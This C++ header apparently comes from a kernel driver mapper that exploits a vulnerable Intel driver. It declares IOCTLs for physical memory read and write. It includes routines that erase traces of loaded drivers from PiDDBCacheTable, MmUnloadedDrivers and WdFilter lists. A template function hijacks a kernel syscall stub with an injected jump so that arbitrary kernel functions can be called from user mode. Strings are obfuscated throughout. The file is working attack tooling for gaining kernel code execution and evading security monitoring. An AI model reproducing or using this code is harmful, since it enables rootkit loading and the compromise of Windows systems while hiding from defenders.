#pragma once
#include <Windows.h>
#include <string>
#include <vector>

#include "utils.hpp"
#include "nt.hpp"

namespace intel_driver
{
	constexpr ULONG32 IOCTL_PHYS_READ_DWORD       = 0x9C412400;
	constexpr ULONG32 IOCTL_PHYS_READ_WORD        = 0x9C412404;
	constexpr ULONG32 IOCTL_PHYS_READ_BYTE        = 0x9C412408;
	constexpr ULONG32 IOCTL_PHYS_WRITE_DWORD      = 0x9C41240C;
	constexpr ULONG32 IOCTL_PHYS_WRITE_WORD       = 0x9C412410;
	constexpr ULONG32 IOCTL_PHYS_WRITE_BYTE       = 0x9C412414;
	constexpr ULONG32 IOCTL_PHYS_READ_DWORD_BULK  = 0x9C412418;
	constexpr ULONG32 IOCTL_PHYS_READ_WORD_BULK   = 0x9C41241C;
	constexpr ULONG32 IOCTL_PHYS_READ_BYTE_BULK   = 0x9C412420;
	constexpr ULONG32 IOCTL_PHYS_WRITE_DWORD_BULK = 0x9C412424;
	constexpr ULONG32 IOCTL_PHYS_WRITE_WORD_BULK  = 0x9C412428;
	constexpr ULONG32 IOCTL_PHYS_WRITE_BYTE_BULK  = 0x9C41242C;

	struct StubEntry {
		uint64_t kaddr;
		std::string name;
	};

	extern HANDLE hDevice;
	extern ULONG64 ntoskrnlAddr;
	extern ULONG64 ntoskrnlPhysBase;
	extern ULONG32 ntoskrnlImageSize;
	extern bool runtimeReady;
	extern ULONG32 loadedDriverTimestamp;
	extern std::wstring vulnerableDriverPath;
	extern std::wstring loadedSymlinkName;
	extern bool g_stubPoolReady;
	extern std::vector<StubEntry> g_stubPool;

	HANDLE OpenDeviceHandle();
	void CloseDeviceHandle();

	bool PhysicalRead(uint64_t physical_address, void* buffer, uint64_t size);
	bool PhysicalWrite(uint64_t physical_address, const void* buffer, uint64_t size);
	bool ScanForNtoskrnlPhysBase();

	bool ClearPiDDBCacheTable();
	bool ExAcquireResourceExclusiveLite(PVOID Resource, BOOLEAN wait);
	bool ExReleaseResourceLite(PVOID Resource);
	BOOLEAN RtlDeleteElementGenericTableAvl(PVOID Table, PVOID Buffer);
	PVOID RtlLookupElementGenericTableAvl(nt::PRTL_AVL_TABLE Table, PVOID Buffer);
	nt::PiDDBCacheEntry* LookupEntry(nt::PRTL_AVL_TABLE PiDDBCacheTable, ULONG timestamp, const wchar_t* name);
	PVOID ResolveRelativeAddress(_In_ PVOID Instruction, _In_ ULONG OffsetOffset, _In_ ULONG InstructionSize);
	NTSTATUS AcquireDebugPrivilege();

	uintptr_t FindPatternAtKernel(uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, const char* szMask);
	uintptr_t FindSectionAtKernel(const char* sectionName, uintptr_t modulePtr, PULONG size);
	uintptr_t FindPatternInSectionAtKernel(const char* sectionName, uintptr_t modulePtr, BYTE* bMask, const char* szMask);

	bool ClearKernelHashBucketList();
	bool ClearWdFilterDriverList();

	bool IsRunning();
	NTSTATUS Load();
	NTSTATUS Unload();

	bool ReadMemory(uint64_t address, void* buffer, uint64_t size);
	bool WriteMemory(uint64_t address, void* buffer, uint64_t size);
	bool WriteToReadOnlyMemory(uint64_t address, void* buffer, uint32_t size);

	uint64_t MmAllocateIndependentPagesEx(uint32_t size);
	bool MmFreeIndependentPages(uint64_t address, uint32_t size);
	BOOLEAN MmSetPageProtection(uint64_t address, uint32_t size, ULONG new_protect);

	uint64_t AllocatePool(nt::POOL_TYPE pool_type, uint64_t size);
	bool FreePool(uint64_t address);
	uint64_t GetKernelModuleExport(uint64_t kernel_module_base, const std::string& function_name);
	bool ClearMmUnloadedDrivers();
	std::wstring GetDriverNameW();
	std::wstring GetDriverPath();
	std::wstring GetSymlinkName();

	bool PopulateStubPool();
	bool PickStub(uint64_t& out_kaddr, std::string& out_name);

	template<typename T, typename ...A>
	bool CallKernelFunction(T* out_result, uint64_t kernel_function_address, const A ...arguments) {
		constexpr auto call_void = std::is_same_v<T, void>;

		static_assert(sizeof...(A) <= 4, "CallKernelFunction: max 4 arguments");

		if constexpr (!call_void) {
			if (!out_result)
				return false;
		}
		else {
			UNREFERENCED_PARAMETER(out_result);
		}

		if (!kernel_function_address)
			return false;

		HMODULE ntdll = GetModuleHandleA(ENC("ntdll.dll").c_str());
		if (ntdll == 0)
			return false;

		if (!PopulateStubPool())
			return false;

		uint64_t kernel_stub = 0;
		std::string stub_name;
		if (!PickStub(kernel_stub, stub_name))
			return false;

		const auto UserStub = reinterpret_cast<void*>(GetProcAddress(ntdll, stub_name.c_str()));
		if (!UserStub)
			return false;

		uint8_t kernel_injected_jmp[] = { 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0 };
		uint8_t original_kernel_function[sizeof(kernel_injected_jmp)];
		*(uint64_t*)&kernel_injected_jmp[2] = kernel_function_address;

		if (!ReadMemory(kernel_stub, &original_kernel_function, sizeof(kernel_injected_jmp)))
			return false;

		if (original_kernel_function[0] == 0x48 && original_kernel_function[1] == 0xb8 &&
			original_kernel_function[10] == 0xff && original_kernel_function[11] == 0xe0)
			return false;

		if (!WriteToReadOnlyMemory(kernel_stub, &kernel_injected_jmp, sizeof(kernel_injected_jmp)))
			return false;

		if constexpr (!call_void) {
			using FunctionFn = T(__stdcall*)(A...);
			const auto Function = reinterpret_cast<FunctionFn>(UserStub);
			*out_result = Function(arguments...);
		}
		else {
			using FunctionFn = void(__stdcall*)(A...);
			const auto Function = reinterpret_cast<FunctionFn>(UserStub);
			Function(arguments...);
		}

		return WriteToReadOnlyMemory(kernel_stub, original_kernel_function, sizeof(kernel_injected_jmp));
	}

	class ScopedPriorityBoost {
		HANDLE th;
		int oldPrio;
	public:
		ScopedPriorityBoost() : th(GetCurrentThread()), oldPrio(GetThreadPriority(GetCurrentThread())) {
			SetThreadPriority(th, THREAD_PRIORITY_TIME_CRITICAL);
		}
		~ScopedPriorityBoost() {
			SetThreadPriority(th, oldPrio);
		}
	};
}
